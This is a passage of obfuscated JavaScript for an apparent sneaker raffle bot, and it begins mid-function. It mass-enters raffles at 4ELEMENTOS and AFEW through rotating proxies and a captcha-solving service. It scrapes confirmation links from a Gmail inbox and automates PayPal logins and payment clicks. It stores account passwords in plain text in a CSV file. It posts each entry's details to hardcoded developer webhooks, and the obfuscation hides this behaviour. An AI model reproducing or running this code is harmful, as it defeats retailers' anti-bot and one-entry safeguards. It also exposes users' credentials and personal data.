        let _0x56430c = await _0x7c4c0f['get']('Password');
        return _0x5f59e5['Password'] = _0x56430c['Password'], _0x1ed524['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x5f59e5['Email'] + ',' + _0x5f59e5['Password'] + ',' + _0x5f59e5['Proxy']), _0x5f59e5;
    }
    let _0x4511fb = await _0x3545ff();
    var _0x27ecc5 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x1f9d86 = await _0x7c4c0f['get']('Amount'), _0xbcaadf = _0x1f9d86['Amount'];
    async function _0x27fecd() {
        let _0x5de6f1 = 0x0;
        var _0x45e70a = new _0x518654({
            'user': _0x263298['masterMail'],
            'password': _0x263298['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x472508(_0x220dc5) {
            _0x45e70a['openBox']('INBOX', ![], _0x220dc5);
        }
        _0x45e70a['once']('ready', function () {
            _0x472508(function (_0x2587f6, _0x11ea92) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x2587f6)
                    throw _0x2587f6;
                _0x45e70a['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x19c0a4, _0x252617) {
                    if (!_0x252617 || !_0x252617['length'])
                        console['log'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20No\x20mails\x20found'), _0x45e70a['end']();
                    else {
                        _0x252617 = _0x252617['slice'](0x0, _0xbcaadf);
                        var _0x3c3c02 = _0x45e70a['seq']['fetch'](_0x252617, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x3c3c02['on']('message', function (_0x25221e, _0x4e0747) {
                            var _0xb337b1 = '(#' + _0x4e0747 + ')\x20';
                            _0x25221e['on']('body', function (_0x24a2dd, _0x37a4c1) {
                                _0x504fd9(_0x24a2dd, (_0x548bc3, _0x24a322) => {
                                    if (_0x24a322['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x24a322['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x24a322['text']['split']('[')[0x2];
                                        var _0x486ad4 = mes['split'](']')[0x0];
                                        _0x27ecc5['push'](_0x486ad4);
                                    }
                                });
                            }), _0x25221e['once']('end', function () {
                                _0x5de6f1++;
                            });
                        }), _0x3c3c02['once']('error', function (_0x422b5a) {
                            console['log']('Fetch\x20error:\x20' + _0x422b5a);
                        }), _0x3c3c02['once']('end', function () {
                            _0x45e70a['end']();
                        });
                    }
                });
            });
        }), _0x45e70a['once']('error', function (_0x32e6ca) {
            console['log'](_0x561058['red'](_0x32e6ca['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x45e70a['once']('end', async function () {
        }), _0x45e70a['connect']();
    }
    try {
        _0x27fecd(), await _0x9175f4(0xfa0), console['log']('Found\x20' + _0x27ecc5['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x9175f4(0xfa0);
    }
    var _0x1af405;
    _0x73a448('' + _0x5eed02);
    var _0x656ecf = _0x4511fb['Proxy']['split'](':'), _0x47da3f;
    try {
        _0x47da3f = await _0x45f1d0['launch']({
            'userDataDir': 'sessions/' + _0x4511fb['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x656ecf[0x0] + ':' + _0x656ecf[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x47da3f = await _0x45f1d0['launch']({
            'userDataDir': 'sessions/' + _0x4511fb['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x656ecf[0x0] + ':' + _0x656ecf[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Getting\x20Session');
        const _0x441100 = await _0x47da3f['newPage']();
        await _0x441100['authenticate']({
            'username': '' + _0x656ecf[0x2],
            'password': '' + _0x656ecf[0x3]
        }), await _0x441100['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x441100['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x441100['waitForSelector']('#email');
            let _0x3b9b5f = await _0x441100['$eval']('#email', _0x344e36 => _0x344e36['getAttribute']('value'));
            if (_0x3b9b5f == '') {
                await _0x441100['type']('#email', _0x4511fb['Email']), await _0x9175f4(0x1d3);
                let _0x5d716a = await _0x441100['$']('#splitPassword');
                _0x5d716a && (await _0x441100['click']('#btnNext'), await _0x9175f4(0xa28)), await _0x441100['type']('#password', _0x4511fb['Password']), await _0x9175f4(0x35c), await _0x441100['click']('#btnLogin');
            } else
                await _0x441100['type']('#password', _0x4511fb['Password']), await _0x9175f4(0x35c), await _0x441100['click']('#btnLogin');
            await _0x441100['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Successfully\x20logged\x20in'), await _0x9175f4(0x2710);
        } catch (_0x262950) {
            throw new Error('Login\x20session\x20expired\x20' + _0x262950);
        }
        for (var _0xbd3914 = 0x0; _0xbd3914 < _0x27ecc5['length']; _0xbd3914++) {
            console['log'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Task\x20' + (_0xbd3914 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x73a448(_0x5eed02 + '\x20Task\x20' + (_0xbd3914 + 0x1) + '\x20/\x20' + _0x27ecc5['length']);
            const _0x2c489d = await _0x47da3f['newPage']();
            await _0x2c489d['goto']('' + _0x27ecc5[_0xbd3914], { 'waitUntil': 'networkidle2' }), await _0x9175f4(0xbb8);
            try {
                const _0x3a6000 = await _0x2c489d['$']('#challenge-heading');
                _0x3a6000 && (console['log'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Task\x20' + (_0xbd3914 + 0x1) + '\x20:\x20' + _0x561058['yellow']('2FA\x20Required')), await _0x2c489d['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x9175f4(0x9c40), await _0x2c489d['waitForSelector']('#payment-submit-btn'), await _0x2c489d['$eval']('#payment-submit-btn', _0x7393c8 => _0x7393c8['click']()), await _0x2c489d['click']('#payment-submit-btn');
                try {
                    await _0x2c489d['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x9175f4(0x5dc), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Task\x20' + (_0xbd3914 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1ad4f8) {
                    _0x20c26a = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x1ad4f8['message']);
                } finally {
                    if (_0x20c26a == 'yes' && _0x4ca0dc != 0x2) {
                        console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x5eed02['name'] + ']\x20Task\x20' + (_0xbd3914 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4ca0dc + '\x20/\x205)')), _0xbd3914 = _0xbd3914 - 0x1, _0x4ca0dc = _0x4ca0dc + 0x1;
                        continue;
                    }
                    _0x20c26a == 'yes' && _0x4ca0dc >= 0x2 && (_0x194f3c(csv[_0xbd3914], _0x5eed02), _0x20c26a = 'no', _0x4ca0dc = 0x0), await _0x2c489d['close'](), await _0x9175f4(0x4650);
                }
            } catch (_0x591cfb) {
                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x5eed02 + ']\x20Task\x20' + (_0xbd3914 + 0x1) + '\x20:\x20' + _0x591cfb));
            }
        }
    } catch (_0x2c9d63) {
        console['log'](_0x561058['red']('' + _0x2c9d63));
    } finally {
        await _0x47da3f['close']();
    }
}
const _0x16913c = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x4ba6ec, _0x3bb1ea, _0x4c0b4c) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1b03bc = 0x0; _0x1b03bc < _0x3bb1ea['length']; _0x1b03bc++) {
                        if (_0x245a1e != 'yes')
                            var _0x245a1e = '', _0x19781a = 0x0;
                        var _0x3f1f66;
                        try {
                            await _0x5c0aeb(_0x3bb1ea, _0x1b03bc);
                        } catch {
                            _0x245a1e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x73a448(_0x4ba6ec['name'] + '\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20/\x20' + _0x3bb1ea['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        var _0x3327e9 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x4fc123 = Math['round'](Math['random']() * (_0x3327e9['length'] - 0x1));
                        _0x3bb1ea[_0x1b03bc]['Size'] == 'RANDOM' && (_0x3bb1ea[_0x1b03bc]['Size'] = _0x3327e9[_0x4fc123]);
                        var _0xeddbf2 = Math['round'](Math['random']() * (_0x4c0b4c['length'] - 0x1)), _0x3c4b7b = _0x4c0b4c[_0xeddbf2]['split'](':'), _0x4a4c21;
                        try {
                            _0x4a4c21 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c4b7b[0x0] + ':' + _0x3c4b7b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4a4c21 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c4b7b[0x0] + ':' + _0x3c4b7b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x18c418 = await _0x4a4c21['newPage']();
                            await _0x18c418['authenticate']({
                                'username': '' + _0x3c4b7b[0x2],
                                'password': '' + _0x3c4b7b[0x3]
                            }), await _0x18c418['setRequestInterception'](!![]), _0x18c418['on']('request', _0x55bd6e => {
                                _0x55bd6e['resourceType']() === 'image' || _0x55bd6e['resourceType']() === 'font' || _0x55bd6e['resourceType']() === 'media' ? _0x55bd6e['abort']() : _0x55bd6e['continue']();
                            }), await _0x18c418['goto'](_0x3bb1ea[_0x1b03bc]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x18c418['waitForSelector']('#accept-all-gdpr'), await _0x18c418['click']('#accept-all-gdpr'), await _0x18c418['waitForSelector']('#raffles-product'), await _0x9175f4(0x3e8), await _0x18c418['$eval']('#raffles-product', _0x5222f3 => _0x5222f3['click']()), await _0x9175f4(0x1388), await _0x18c418['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x2dd6bd = await _0x18c418['$']('.fancybox-inner\x20>\x20iframe'), _0x10d437 = await _0x2dd6bd['contentFrame']();
                            console['log'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Checking\x20Information'), await _0x10d437['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x9175f4(0x1f4), await _0x10d437['type']('input[name=\x22sm-form-email\x22]', _0x3bb1ea[_0x1b03bc]['Email']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-name\x22]', _0x3bb1ea[_0x1b03bc]['FirstName'] + '\x20' + _0x3bb1ea[_0x1b03bc]['LastName']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-street\x22]', _0x3bb1ea[_0x1b03bc]['Address1'] + '\x20' + _0x3bb1ea[_0x1b03bc]['HouseNumber'] + '\x20' + _0x3bb1ea[_0x1b03bc]['Address2']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-city\x22]', _0x3bb1ea[_0x1b03bc]['City']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-province\x22]', _0x3bb1ea[_0x1b03bc]['State']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-zip\x22]', _0x3bb1ea[_0x1b03bc]['Zip']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-country\x22]', _0x3bb1ea[_0x1b03bc]['Country']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-form-phone\x22]', _0x3bb1ea[_0x1b03bc]['Phone']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x3bb1ea[_0x1b03bc]['Follower']), await _0x9175f4(0xc8), await _0x10d437['type']('input[name=\x22sm-cst.size\x22]', _0x3bb1ea[_0x1b03bc]['Size']), await _0x9175f4(0x1f4), await _0x10d437['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x9175f4(0x1f4), await _0x10d437['click']('.icheckbox_simple-custom'), await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Sending\x20Request'), await _0x10d437['$eval']('form', _0x55a4b6 => _0x55a4b6['submit']()), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x245a1e = '';
                            var _0x4a8c9d = await _0x22ebf6(_0x3bb1ea[_0x1b03bc], _0x4ba6ec, 'dev', ![]), _0x4c75b9 = await _0x22ebf6(_0x3bb1ea[_0x1b03bc], _0x4ba6ec, 'pub', ![]);
                            const _0x472aca = {
                                'succesDEVMSG': { 'embeds': [_0x4a8c9d] },
                                'succesPUBMSG': { 'embeds': [_0x4c75b9] }
                            };
                            try {
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x472aca['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x472aca['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x472aca['succesPUBMSG']);
                            } catch (_0x4c721e) {
                                console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4c721e));
                            }
                        } catch (_0x50e7fa) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20' + _0x50e7fa)), _0x3f1f66 = '' + _0x50e7fa;
                            var _0xb23b83 = await _0x22ebf6(_0x3bb1ea[_0x1b03bc], _0x4ba6ec, 'dev', !![], _0x3f1f66), _0x4a8c9d = await _0x22ebf6(_0x3bb1ea[_0x1b03bc], _0x4ba6ec, 'dev', ![]), _0x4c75b9 = await _0x22ebf6(_0x3bb1ea[_0x1b03bc], _0x4ba6ec, 'pub', ![]);
                            const _0xa3b749 = {
                                'succesDEVMSG': { 'embeds': [_0x4a8c9d] },
                                'succesPUBMSG': { 'embeds': [_0x4c75b9] }
                            };
                            _0xa3b749['errorDEV'] = { 'embeds': [_0xb23b83] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0xa3b749['errorDEV']), await _0x1cac9f(_0x569bf6, _0xa3b749['errorDEV']), _0x50e7fa != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x245a1e = 'yes');
                        } finally {
                            _0x4a4c21['close']();
                            if (_0x245a1e == 'yes' && _0x19781a != 0x5 && _0x3f1f66 != 'Size\x20Not\x20Found') {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Task\x20' + (_0x1b03bc + 0x1) + '\x20:\x20Retrying\x20(' + _0x19781a + '\x20/\x205)\x20')), _0x1b03bc = _0x1b03bc - 0x1, _0x19781a = _0x19781a + 0x1;
                                continue;
                            }
                            _0x245a1e == 'yes' && _0x19781a >= 0x5 && (_0x194f3c(_0x3bb1ea[_0x1b03bc], _0x4ba6ec), _0x245a1e = 'no', _0x19781a = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x4ba6ec['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x1e16b8, _0xddd170) {
                    var _0x32d7f2 = [];
                    async function _0x9af5f3() {
                        var _0x2755e6 = new _0x518654({
                            'user': _0x263298['masterMail'],
                            'password': _0x263298['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5a17a4(_0x54440b) {
                            _0x2755e6['openBox']('INBOX', ![], _0x54440b);
                        }
                        _0x2755e6['once']('ready', function () {
                            _0x5a17a4(function (_0x36b0dd, _0x5a267c) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x36b0dd)
                                    throw _0x36b0dd;
                                _0x2755e6['seq']['search'](['UNSEEN'], function (_0x521a4a, _0x50499a) {
                                    if (!_0x50499a || !_0x50499a['length'])
                                        console['log'](_0x1500d7() + '\x20[' + _0x1e16b8['name'] + ']\x20No\x20mails\x20found'), _0x2755e6['end']();
                                    else {
                                        var _0x4c7f60 = _0x2755e6['seq']['fetch'](_0x50499a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4c7f60['on']('message', function (_0x156419, _0xa82628) {
                                            var _0x58ecdb = '(#' + _0xa82628 + ')\x20';
                                            _0x156419['on']('body', function (_0x18d16a, _0x465bef) {
                                                _0x504fd9(_0x18d16a, (_0x1dbbd3, _0x7b90a) => {
                                                    if (_0x7b90a['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x2afef = _0x7b90a['html']['split']('\x0a');
                                                        for (var _0x31ca0d = 0x0; _0x31ca0d < _0x2afef['length']; _0x31ca0d++) {
                                                            if (_0x2afef[_0x31ca0d]['includes']('salesmanago') && _0x2afef[_0x31ca0d]['includes']('<td') && _0x2afef[_0x31ca0d]['includes']('href')) {
                                                                var _0x19b9b5 = _0x2afef[_0x31ca0d]['split']('href=\x22'), _0x3461d7 = _0x19b9b5[0x1]['split']('\x22')[0x0];
                                                                _0x32d7f2['push'](_0x3461d7);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x156419['once']('end', function () {
                                            });
                                        }), _0x4c7f60['once']('error', function (_0x1597dc) {
                                            console['log']('Fetch\x20error:\x20' + _0x1597dc);
                                        }), _0x4c7f60['once']('end', function () {
                                            _0x2755e6['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x2755e6['once']('error', function (_0x5f19f2) {
                            console['log'](_0x561058['red'](_0x5f19f2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x2755e6['once']('end', async function () {
                        }), _0x2755e6['connect']();
                    }
                    async function _0x14d2bb(_0x592c89, _0x2cc51f, _0x5c2c50) {
                        for (var _0x1957fd = 0x0; _0x1957fd < _0x2cc51f['length']; _0x1957fd++) {
                            async function _0x1f8abb(_0x23de8, _0x538d0e, _0x4aeed4, _0x345b63, _0x165a5a) {
                                var _0x5c5d87, _0xbb3c71 = {}, _0xdae8ec = [], _0x104700 = {}, _0x1fa7ab = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x17dbfb = Math['round'](Math['random']() * (_0x1fa7ab['length'] - 0x1));
                                _0x345b63[_0x23de8]['Size'] == 'RANDOM' && (_0x345b63[_0x23de8]['Size'] = _0x1fa7ab[_0x17dbfb]);
                                !_0x345b63 && (_0x345b63 = {});
                                if (_0x263298['useRandomProxy'] = ![])
                                    var _0x441685 = _0x165a5a[_0x23de8]['split'](':');
                                else
                                    var _0x2ecbf5 = Math['round'](Math['random']() * (_0x165a5a['length'] - 0x1)), _0x441685 = _0x165a5a[_0x2ecbf5]['split'](':');
                                var _0x3bfe6d = {
                                    'jar': _0x57be51,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4aeed4['url'],
                                    'headers': _0x4aeed4['headers'],
                                    'body': JSON['stringify'](_0xbb3c71),
                                    'proxy': 'http://' + _0x441685[0x2] + ':' + _0x441685[0x3] + '@' + _0x441685[0x0] + ':' + _0x441685[0x1]
                                };
                                return _0x538d0e != 'ver' && (_0x3bfe6d['url'] = _0x4aeed4['url'], _0x3bfe6d['headers'] = _0x4aeed4['headers']), _0x538d0e == 'ver' && (_0x3bfe6d['method'] = 'GET', _0x3bfe6d['url'] = _0x345b63[_0x23de8]), new Promise(function (_0x9a5401, _0x54d247) {
                                    callback = async (_0x2e7976, _0xf3c400, _0x28f357) => {
                                        if (!_0x2e7976 && _0xf3c400['statusCode'] == 0xca || !_0x2e7976 && _0xf3c400['statusCode'] == 0xc8) {
                                            if (_0x538d0e != 'ver') {
                                                var _0x561ed0 = await _0x22ebf6(_0x345b63[_0x23de8], _0x4aeed4, 'dev', ![]), _0x2c3626 = await _0x22ebf6(_0x345b63[_0x23de8], _0x4aeed4, 'pub', ![]);
                                                const _0x4ec9f4 = {
                                                    'succesDEVMSG': { 'embeds': [_0x561ed0] },
                                                    'succesPUBMSG': { 'embeds': [_0x2c3626] }
                                                };
                                                if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                                    try {
                                                        await _0x1cac9f(_0x263298['webhook'], _0x4ec9f4['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x4ec9f4['succesDEVMSG']), await _0x9175f4(0xc8);
                                                try {
                                                    await _0x1cac9f(_0x2f03c2, _0x4ec9f4['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3e2f6d(_0x345b63[_0x23de8], _0x4aeed4);
                                            }
                                            _0x9a5401(console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x4aeed4['name'] + ']\x20Task\x20' + (_0x23de8 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x538d0e != 'ver') {
                                                var _0x1c003c = '' + _0x2e7976, _0x4e8528 = await _0x22ebf6(_0x345b63[_0x23de8], _0x4aeed4, 'dev', !![], _0x1c003c), _0x537574 = {};
                                                _0x537574['errorDEV'] = { 'embeds': [_0x4e8528] }, _0x194f3c(_0x345b63[_0x23de8], _0x4aeed4), _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x537574['errorDEV']), await _0x1cac9f(_0x569bf6, _0x537574['errorDEV']);
                                            }
                                            _0x54d247(console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x4aeed4['name'] + ']\x20Task\x20' + (_0x23de8 + 0x1) + ':\x20' + _0x2e7976)));
                                        }
                                    };
                                    try {
                                        _0x538d0e != 'ver' ? console['log'](_0x1500d7() + '\x20[' + _0x4aeed4['name'] + ']\x20Task\x20' + (_0x23de8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xbb3c71['data']['attributes']['email']) : console['log'](_0x1500d7() + '\x20[' + _0x4aeed4['name'] + ']\x20Task\x20' + (_0x23de8 + 0x1) + ':\x20Fetching\x20Response'), _0x44d2d2(_0x3bfe6d, callback);
                                    } catch (_0x51a87d) {
                                        console['log'](_0x1500d7() + '\x20Task\x20' + (_0x23de8 + 0x1) + ':\x20' + _0x51a87d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1f8abb(_0x1957fd, 'ver', _0x592c89, _0x2cc51f, _0x5c2c50), console['log'](_0x1500d7() + '\x20[' + _0x592c89['name'] + ']\x20Sleeping\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                            } catch (_0x224c7a) {
                            }
                        }
                    }
                    try {
                        _0x9af5f3(), await _0x9175f4(0xfa0), console['log']('Found\x20' + _0x32d7f2['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x14d2bb(_0x1e16b8, _0x32d7f2, _0xddd170);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x3d3f22, _0x54c3ea, _0x5522a2) {
                for (var _0x2088b6 = 0x0; _0x2088b6 < _0x54c3ea['length']; _0x2088b6++) {
                    _0x263298['AfewDelay'] = _0x263298['delay'];
                    var _0x3659e4;
                    if (_0x28c7e8 != 'yes')
                        var _0x28c7e8 = '', _0x564c52 = 0x0;
                    var _0x36798c = _0x54c3ea[_0x2088b6]['Url'], _0x192ee1 = _0x54c3ea[_0x2088b6];
                    _0x73a448(_0x3d3f22['name'] + '\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20/\x20' + _0x54c3ea['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                    try {
                        await _0x5c0aeb(_0x54c3ea, _0x2088b6);
                    } catch {
                        _0x28c7e8 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x140dd4(_0x4bff38) {
                        const _0x50e2b4 = _0x1ed524['readFileSync']('../successful-tasks.csv', 'utf8'), _0x53ca02 = _0x2057e4['parse'](_0x50e2b4, { 'header': !![] })['data'];
                        let _0x14afcf = ![];
                        for (var _0xefab2b of _0x53ca02) {
                            if (_0xefab2b['Url'] == _0x4bff38['Url'] && _0xefab2b['Email'] == _0x4bff38['Email']) {
                                _0x14afcf = !![];
                                break;
                            }
                        }
                        return _0x14afcf;
                    }
                    if (await _0x140dd4(_0x54c3ea[_0x2088b6]) == !![]) {
                        console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x295390 = await _0x22ebf6(_0x54c3ea[_0x2088b6], _0x3d3f22, 'dev', ![]), _0x596cf2 = await _0x22ebf6(_0x54c3ea[_0x2088b6], _0x3d3f22, 'pub', ![]);
                    const _0x3f8bfc = {
                        'succesDEVMSG': { 'embeds': [_0x295390] },
                        'succesPUBMSG': { 'embeds': [_0x596cf2] }
                    };
                    if (_0x54c3ea[_0x2088b6]['Email'] == '' || _0x54c3ea[_0x2088b6]['FirstName'] == '' || _0x54c3ea[_0x2088b6]['LastName'] == '' || _0x54c3ea[_0x2088b6]['Country'] == '' || _0x54c3ea[_0x2088b6]['Size'] == '' || _0x54c3ea[_0x2088b6]['Address1'] == '' || _0x54c3ea[_0x2088b6]['Zip'] == '') {
                        console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x263298['useRandomProxy'] = ![])
                        var _0x54fc6a = _0x5522a2[_0x2088b6]['split'](':');
                    else
                        var _0x222f7f = Math['round'](Math['random']() * (_0x5522a2['length'] - 0x1)), _0x54fc6a = _0x5522a2[_0x222f7f]['split'](':');
                    var _0x4f0f0d;
                    try {
                        _0x4f0f0d = await _0x45f1d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x54fc6a[0x0] + ':' + _0x54fc6a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
